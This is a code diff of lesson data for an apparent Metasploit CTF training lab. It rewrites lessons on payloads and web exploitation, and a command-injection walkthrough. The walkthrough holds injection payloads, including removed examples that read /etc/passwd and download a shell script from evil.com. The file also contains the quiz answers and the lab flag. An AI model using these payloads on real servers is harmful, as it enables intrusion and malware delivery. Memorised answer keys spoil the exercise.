@@ -1,50 +1,15 @@
-/* ================================================
-   CTF LABS — Metasploit Deep Dive Lab Data
-   ================================================ */
-
 const LESSONS = [
-  // ─── LESSON 1: THE METASPLOIT DATABASE ───────────────────────────
+  //  LESSON 1: THE METASPLOIT DATABASE 
   {
     title: "The Metasploit Database (db_status)",
     points: 40,
-    icon: "🗄️",
+    icon: "",
     practical: false,
-    content: `THE METASPLOIT DATABASE & WORKSPACES
+    content: `THE SECRET NOTEBOOK
+Imagine you are a detective hired to investigate a giant warehouse with hundreds of locked doors and rooms. If you don't write down which doors you've checked, which keys worked on which locks, and what treasures you found inside each room, you will quickly get confused and lost. To prevent this, the Metasploit framework uses a built-in database (a system called PostgreSQL) to act like a smart, organized digital notebook. It automatically records every target computer it discovers, every open door (port), and every vulnerability it finds.
 
-When conducting a penetration test or security assessment, managing information is key. Metasploit integrates with a PostgreSQL database to store host information, open ports, vulnerability scan results, services, and credentials.
-
-Why Use the Database?
-─────────────────────
-Instead of copy-pasting hosts and open ports into a text file, Metasploit's database allows you to:
-  • Save Nmap scans directly into Metasploit database.
-  • Keep track of discovered services and hosts.
-  • Quickly set RHOSTS by referencing database entries.
-  • Maintain session logs and credentials.
-
-Key Database Commands in msfconsole:
-─────────────────────────────────────
-  1. db_status
-     Checks if Metasploit is successfully connected to the PostgreSQL database.
-     Example output:
-     msf6 > db_status
-     [*] Connected to msf. Connection type: postgresql.
-
-  2. workspace
-     Lists available workspaces. Workspaces isolate different target networks.
-     • Create a workspace: workspace -a <name>
-     • Delete a workspace: workspace -d <name>
-     • Switch workspaces: workspace <name>
-
-  3. db_nmap
-     Runs Nmap directly from within msfconsole and automatically saves the scan results to the active workspace database.
-     Example:
-     msf6 > db_nmap -sV 10.10.10.5
-
-  4. hosts
-     Lists all hosts saved in the database.
-
-  5. services
-     Lists all services discovered on all hosts (ports, protocols, names, states).`,
+THE CHAPTER SYSTEM
+Inside this digital notebook, you can create separate chapters called "Workspaces" so your notes don't get mixed up. For example, if you are testing the billing office network and the customer support network, you make a workspace for each. You can run commands inside Metasploit to manage your notes: "db_status" checks if your database notebook is connected, "workspace" lists or creates chapters, "db_nmap" runs a scan and saves the results directly to the database, and the "hosts" and "services" commands print a neat table of the targets and programs discovered.`,
     questions: [
       { q: "What database management system does Metasploit integrate with? (one word)", a: "postgresql" },
       { q: "What command verifies the connection status of the Metasploit database?", a: "db_status" },
@@ -54,46 +19,17 @@ Key Database Commands in msfconsole:
     ]
   },
 
-  // ─── LESSON 2: METASPLOIT MODULE TYPES & PATHS ───────────────────
+  //  LESSON 2: METASPLOIT MODULE TYPES & PATHS 
   {
     title: "Module Types, Search Filters & Context",
     points: 50,
-    icon: "📂",
+    icon: "",
     practical: false,
-    content: `DEEP DIVE INTO MODULE PATHS & FILTERING
+    content: `THE TOOL CABINET
+Metasploit has thousands of different hacking programs organized into a neat cabinet of folders. Every tool has a path name that looks like: "type/platform/service/name". For example, "exploit/linux/http/webmin_backdoor" tells you that the tool is an exploit, built for a Linux operating system, targeting a web server service (HTTP), and its name is "webmin_backdoor". Knowing this layout helps you navigate the system and select the right tool for the job.
 
-Metasploit organizes its modules systematically in a directory structure. Understanding this structure helps you find modules quickly.
-
-Module Directory Structure:
-───────────────────────────
-The standard Metasploit path looks like:
-  <type>/<platform>/<service>/<name>
-
-For example:
-  exploit/linux/http/webmin_backdoor
-    • type = exploit
-    • platform = linux
-    • service/protocol = http
-    • name = webmin_backdoor
-
-Advanced Search Filters:
-────────────────────────
-When you run a standard 'search' command, Metasploit returns hundreds of results. You can narrow down your search using filters:
-
-  • type:<type>      - Search by module type (exploit, auxiliary, post, payload, encoder, evasion, nop)
-  • platform:<name>  - Search by target OS/platform (windows, linux, unix, android, osx)
-  • port:<number>    - Search for modules targeting a specific port
-  • cve:<year>       - Search by CVE year/number
-  • rank:<rank>      - Search by reliability rank (excellent, great, good, normal, average, low, manual)
-
-Examples:
-  msf6 > search type:exploit platform:linux port:80
-  msf6 > search cve:2021 name:log4j
-
-The 'info' Command:
-──────────────────
-Before using any module, you should inspect its capabilities, author, CVE references, and default options.
-  msf6 > info exploit/linux/http/webmin_backdoor`,
+THE SEARCH FILTERS
+Because the cabinet has over 2000 tools, using a standard search can return too many results. To help you, Metasploit lets you use filters like "type:" to search for specific tool categories, "platform:" to search for operating systems, "port:" to target specific ports, or "cve:" to find tools matching a specific security advisory year. When you find a tool, you can type "info" followed by its path to read a detailed description of what it does, who wrote it, and its reliability ranking (with "excellent" being the most reliable).`,
     questions: [
       { q: "What search filter restricts search results to 'exploit' modules only?", a: "type:exploit" },
       { q: "What search filter restricts results to the Windows platform?", a: "platform:windows" },
@@ -102,41 +38,17 @@ Before using any module, you should inspect its capabilities, author, CVE refere
     ]
   },
 
-  // ─── LESSON 3: PAYLOADS DEEP DIVE (STAGED VS UNSTAGED) ───────────
+  //  LESSON 3: PAYLOADS DEEP DIVE (STAGED VS UNSTAGED) 
   {
     title: "Payloads: Staged vs Unstaged",
     points: 50,
-    icon: "💣",
+    icon: "",
     practical: false,
-    content: `STAGED VS UNSTAGED PAYLOADS
+    content: `THE DROPPED BOXES
+When you successfully bypass a server's security lock, you send a payload—which is the computer code you want to run. Metasploit divides payloads into two types: Staged and Unstaged. A staged payload is split into two steps. First, you send a tiny code snippet (Stage 0, or the Stager) whose only job is to connect back to your Kali machine and download the larger, main program (Stage 1). This is useful when the security hole only allows you to send a tiny message at first.
 
-A payload is the shellcode/application executed on the target after exploitation. Metasploit splits payloads into two main categories: Staged and Unstaged.
-
-1. Staged Payloads:
-───────────────────
-Staged payloads are split into two parts:
-  • Stage 0 (Stager): A tiny stub of code sent to the target. Its only job is to connect back to the attacker's machine, allocate memory, and download the larger, full payload.
-  • Stage 1 (Stage): The actual full payload (like Meterpreter) sent over the network once the stager connects.
-
-Pros: Very small footprint, fits into restricted buffer spaces in memory.
-Cons: Requires a two-step network connection; more network noise.
-
-How to identify in Metasploit: Staged payloads use a slash (/) to separate elements.
-  Example: windows/meterpreter/reverse_tcp
-
-2. Unstaged Payloads (Singles):
-───────────────────────────────
-Unstaged payloads are completely self-contained. The entire payload code is sent at once in a single transmission.
-
-Pros: More stable, works in environments where multiple network connections are blocked.
-Cons: Much larger file size, may not fit in tight exploits.
-
-How to identify in Metasploit: Unstaged payloads use an underscore (_) to join components.
-  Example: windows/meterpreter_reverse_tcp
-
-The Meterpreter Payload:
-────────────────────────
-Meterpreter is an advanced, dynamically extensible payload that runs entirely in memory (via DLL injection) and does not write to disk, leaving a minimal footprint.`,
+THE ALL-IN-ONE PACKAGE
+An unstaged payload is a single, complete package that contains the entire program in one go. It is much larger, but because it doesn't need to make a second connection to download more code, it is more stable and works in networks that block extra downloads. You can easily tell them apart by looking at their path names: staged payloads use a slash (like "windows/meterpreter/reverse_tcp"), while unstaged payloads use an underscore (like "windows/meterpreter_reverse_tcp"). The most advanced payload is "Meterpreter," which runs entirely inside the computer's memory so it doesn't leave files on the hard drive!`,
     questions: [
       { q: "What type of payload is split into a tiny stager and a larger stage? (one word)", a: "staged" },
       { q: "Does the payload path 'linux/x86/shell/reverse_tcp' represent a staged or unstaged payload?", a: "staged" },
@@ -145,36 +57,17 @@ Meterpreter is an advanced, dynamically extensible payload that runs entirely in
     ]
   },
 
-  // ─── LESSON 4: EXPLOITING WEB APPLICATIONS ───────────────────────
+  //  LESSON 4: EXPLOITING WEB APPLICATIONS 
   {
     title: "Exploiting Web Applications via Metasploit",
     points: 60,
-    icon: "🌐",
+    icon: "",
     practical: false,
-    content: `EXPLOITING WEB APPLICATIONS
+    content: `TARGETING THE WEBSITES
+Metasploit is famous for network attacks, but it also contains a massive library of web application scanners and exploits. When targeting web servers, we must configure specific variables so the exploit knows where to go. "LHOST" is your local IP address, which tells the server where to send the reverse shell connection. "LPORT" is the port on your Kali machine that is listening for that connection.
 
-While Metasploit is famous for network service exploits (SMB, SSH, FTP), it also has a massive database of web application scanners and exploits.
-
-Web Exploitation Concepts:
-──────────────────────────
-When targeting web apps, the RHOSTS parameter usually refers to the target domain or IP, but web apps often run on custom paths (like /blog or /app). Metasploit uses additional settings:
-
-  • LHOST: Your local interface IP (attacker host). Necessary for reverse shells to know where to connect back.
-  • LPORT: Your local listening port.
-  • TARGETURI (or URI): The directory path of the vulnerable web application.
-  • SSL: Boolean to enable or disable HTTPS transport.
-
-Scanning Web Services:
-──────────────────────
-Before launching an exploit, you should always scan and verify target vulnerability:
-  • auxiliary/scanner/http/http_version: Detects web server banner.
-  • auxiliary/scanner/http/dir_scanner: Locates web directories.
-
-Exploit Verification:
-─────────────────────
-Many exploit modules include a "check" feature that probes the target to see if the vulnerability exists WITHOUT actually running the exploit code.
-  msf6 > check
-  [*] 10.10.10.5:80 - The target is vulnerable.`,
+THE WEB DIRECTORY
+Because web applications don't always run on the homepage, Metasploit uses a setting called "TARGETURI" to define the directory folder where the vulnerable application is installed (like "/blog" or "/app"). If the website requires an encrypted connection, you must also set the "SSL" variable to true. Before running an exploit, you should run scanners like "http_version" to check the server type, and use the "check" command which probes the target to see if the vulnerability exists without actually launching any exploit code.`,
     questions: [
       { q: "What option defines the local listening IP of the attacker for reverse connections?", a: "LHOST" },
       { q: "What option defines the path directory where the web application is hosted? (e.g. /wp-content)", a: "TARGETURI" },
@@ -183,127 +76,20 @@ Many exploit modules include a "check" feature that probes the target to see if 
     ]
   },
 
-  // ─── LESSON 5: PRACTICAL CHALLENGE (DOCKER PANELS SHOWN HERE) ────
+  //  LESSON 5: PRACTICAL CHALLENGE (DOCKER PANELS SHOWN HERE) 
   {
     title: "Practical — Exploit the Target API",
     points: 60,
-    icon: "⚔️",
+    icon: "",
     practical: true,
-    content: `PRACTICAL CHALLENGE — COMMAND INJECTION VIA CURL
+    content: `THE SECRET DIAGNOSTICS
+In this lesson, you are going to exploit a real live target server running inside a Docker container! The target represents a company API portal that has a diagnostics page located at "/api/diagnostics?cmd=ping". The developers forgot to clean the input, allowing users to type commands directly into the "cmd" parameter. When you send a command, the server executes it on the operating system, which is a classic Command Injection vulnerability.
 
-In this practical lesson, you will exploit a vulnerable 
-web API running on a Docker container.
+URL SPELLING RULES
+Because web browsers use special rules for URL text, we cannot use spaces or semicolons directly. We must use "URL Encoding," which replaces special characters with percent codes: a semicolon (;) becomes "%3B" and a space becomes "%20". In terminal language, a semicolon tells the system: "Run the first command, and then immediately run this second command." If we send the payload "cmd=ping%3Bcat%20/etc/flag", the server will run ping, see the semicolon, and run "cat /etc/flag" to print the secret flag!
 
-═══════════════════════════════════════════════════
-  🎯  YOUR MISSION: Find and exploit a Command 
-      Injection vulnerability to capture the flag.
-═══════════════════════════════════════════════════
-
-WHAT IS COMMAND INJECTION?
-──────────────────────────
-The target is a web server called "SecureCorp API Portal".
-It has an endpoint:  /api/diagnostics?cmd=<command>
-
-The developers forgot to sanitise user input — the 'cmd' 
-parameter is passed directly to the server's operating 
-system! This is called OS Command Injection.
-
-
-STEP-BY-STEP WALKTHROUGH:
-─────────────────────────
-
-STEP 1 — Launch Both Containers
-  ┌───────────────────────────────────────────────┐
-  │  ① Click "Launch Target Server" above.        │
-  │  ② Click "Start Kali Container" above.        │
-  │  ③ Note the TARGET IP (e.g. 172.17.0.2)       │
-  │  ④ Note the Kali docker exec command shown.   │
-  └───────────────────────────────────────────────┘
-
-STEP 2 — Connect to Your Kali Container
-  ┌───────────────────────────────────────────────┐
-  │  Open a terminal on your HOST machine and     │
-  │  paste the command shown in the Kali panel:   │
-  │                                               │
-  │  $ docker exec -it <container-id> bash        │
-  │                                               │
-  │  You are now inside Kali Linux!               │
-  └───────────────────────────────────────────────┘
-
-STEP 3 — Discover the Target
-  ┌───────────────────────────────────────────────┐
-  │  Use curl to visit the target homepage:       │
-  │                                               │
-  │  $ curl http://<TARGET_IP>/                   │
-  │                                               │
-  │  You'll see the SecureCorp API Portal HTML.   │
-  │  Notice the hint on the page:                 │
-  │  "/api/diagnostics?cmd=ping"                  │
-  └───────────────────────────────────────────────┘
-
-STEP 4 — Test the Normal Endpoint
-  ┌───────────────────────────────────────────────┐
-  │  Send a legitimate ping command:              │
-  │                                               │
-  │  $ curl http://<TARGET_IP>/api/diagnostics?cmd=ping  │
-  │                                               │
-  │  The server responds with ping output.        │
-  │  This proves the 'cmd' parameter controls     │
-  │  what the server executes!                    │
-  └───────────────────────────────────────────────┘
-
-STEP 5 — Exploit with Command Injection!
-  ┌───────────────────────────────────────────────┐
-  │                                               │
-  │  ⚠️ IMPORTANT: URL ENCODING                  │
-  │  Special characters must be URL-encoded       │
-  │  when sent in a URL:                          │
-  │    ;  →  %3B   (semicolon)                    │
-  │    |  →  %7C   (pipe)                         │
-  │    (space) → %20                              │
-  │                                               │
-  │  The semicolon (;) tells the server to        │
-  │  finish the first command and start a new     │
-  │  one. We URL-encode it so curl sends it       │
-  │  correctly to the server.                     │
-  │                                               │
-  │  Run this exact command (replace <TARGET_IP>  │
-  │  with the IP shown in the Target panel):      │
-  │                                               │
-  │  $ curl "http://<TARGET_IP>/api/diagnostics?cmd=ping%3Bcat%20/etc/flag"  │
-  │                                               │
-  │  ───────────────────────────────────────────  │
-  │  BREAKDOWN:                                   │
-  │  • ping        = the normal command           │
-  │  • %3B         = ; (start a 2nd command)      │
-  │  • cat%20      = cat (space = %20)            │
-  │  • /etc/flag   = the file we want to read     │
-  │  ───────────────────────────────────────────  │
-  │                                               │
-  │  🚩 The server returns the FLAG in JSON!      │
-  └───────────────────────────────────────────────┘
-
-ALTERNATIVE METHOD (pipe instead of semicolon):
-  ┌───────────────────────────────────────────────┐
-  │  $ curl "http://<TARGET_IP>/api/diagnostics?cmd=ping%7Ccat%20/etc/flag"  │
-  │                                               │
-  │  %7C = pipe (|) character — also works!       │
-  └───────────────────────────────────────────────┘
-
-
-WHY THIS WORKS:
-───────────────
-The server takes your 'cmd' parameter and passes it 
-directly to the operating system. When it sees:
-  ping ; cat /etc/flag
-It runs TWO commands: first 'ping', then 'cat /etc/flag'.
-
-In a real attack, this would allow an attacker to:
-  • Read files:    cmd=ping%3Bcat%20/etc/passwd
-  • Download malware:  cmd=ping%3Bwget%20http://evil.com/shell.sh
-  • Create reverse shells back to the attacker
-
-This is why INPUT VALIDATION is critical!`,
+RUNNING THE COMMAND
+To perform the attack, click the "Launch Target Server" and "Start Kali Container" buttons. Connect to your Kali container using the command shown in the box, and type the curl command to visit the diagnostics page with our encoded payload. The server will execute the command and return a JSON message containing the secret flag on your screen! Copy the flag, go to the next lesson, and paste it into the answer box to complete the challenge.`,
     questions: [
       { q: "What Linux command did you use to make HTTP requests from the Kali terminal? (one word)", a: "curl" },
       { q: "What is the URL-encoded representation of a semicolon? (e.g. %XX)", a: "%3B" },
@@ -311,72 +97,20 @@ This is why INPUT VALIDATION is critical!`,
     ]
   },
 
-  // ─── LESSON 6: FLAG SUBMISSION ───────────────────────────────────
+  //  LESSON 6: FLAG SUBMISSION 
   {
-    title: "🚩 Capture the Flag",
+    title: " Capture the Flag",
     points: 20,
-    icon: "🚩",
+    icon: "",
     practical: false,
-    content: `🚩 FLAG SUBMISSION
+    content: `SUBMITTING THE TREASURE
+Congratulations on completing the exploitation phase! If you ran the curl command in your Kali terminal, the server returned a JSON response containing the secret flag. The flag looks like "FLAG{...}". Copy the exact flag value from your terminal, return to this page, and paste it into the box below to claim your points.
 
-═══════════════════════════════════════════════════
-        SUBMIT YOUR CAPTURED FLAG BELOW
-═══════════════════════════════════════════════════
+RECAP OF THE DEEP DIVE
+Let's review the advanced skills you learned today! You studied the Metasploit database (db_status, workspaces, and hosts tables), module structures and search filters, staged versus unstaged payloads, and key web options (LHOST and TARGETURI). You also practiced hands-on command injection using URL encoding to read sensitive files.
 
-If you successfully ran the exploit command from 
-the previous lesson, the server returned a JSON 
-response containing the flag.
-
-⚠️  You MUST run the actual exploit to get the flag!
-    The flag is hidden inside the target container.
-    There is no shortcut — execute the curl command
-    from Lesson 5 to reveal it.
-
-The response will look something like this:
-┌─────────────────────────────────────────────────┐
-│  {                                              │
-│    "status": "success",                         │
-│    "output": "Simulated RCE Triggered:          │
-│               FLAG{?????_????_????_??????}",     │
-│    "debug_info": "Warning: Command              │
-│     sanitization failed. Unauthorized           │
-│     command context executed."                   │
-│  }                                              │
-└─────────────────────────────────────────────────┘
-
-Copy the FLAG{...} value from YOUR terminal output 
-and paste it into the answer box below.
-
-HINT: If you forgot the exploit command, go back 
-to Lesson 5, Step 5 and run:
-  curl "http://<TARGET_IP>/api/diagnostics?cmd=ping%3Bcat%20/etc/flag"
-
-
-QUICK REFERENCE — Commands You Used:
-─────────────────────────────────────
-  ① curl http://<IP>/
-     → Discovered the API hint
-
-  ② curl http://<IP>/api/diagnostics?cmd=ping
-     → Tested the endpoint works
-
-  ③ curl "http://<IP>/api/diagnostics?cmd=ping%3Bcat%20/etc/flag"
-     → Exploited command injection → Got the flag!
-
-
-WHAT YOU LEARNED IN THIS CHALLENGE:
-───────────────────────────────────
-  ✅ Metasploit Database — db_status, workspace, 
-     db_nmap, hosts, services
-  ✅ Module Paths — type/platform/service/name
-  ✅ Search Filters — type:, platform:, cve:, rank:
-  ✅ Staged vs Unstaged Payloads — slash vs underscore
-  ✅ Web Exploitation Options — LHOST, TARGETURI, SSL
-  ✅ URL Encoding for special characters
-  ✅ Practical Command Injection via curl
-  ✅ Why input sanitisation matters
-
-CONGRATULATIONS ON COMPLETING THE METASPLOIT DEEP DIVE! 🎉`,
+THE POWER OF INPUT SANITIZATION
+This lesson shows why input sanitization is so important. When building applications, developers must never pass user input directly to system command shells. Instead, they should use secure APIs that do not invoke the operating system shell, or run input through strict sanitization filters that strip away characters like semicolons and pipes, keeping their servers safe from injection attacks.`,
     questions: [
       { q: "Submit the flag you captured from the vulnerable target:", a: "FLAG{MSF_D33P_D1V3_M4ST3R}" }
     ]
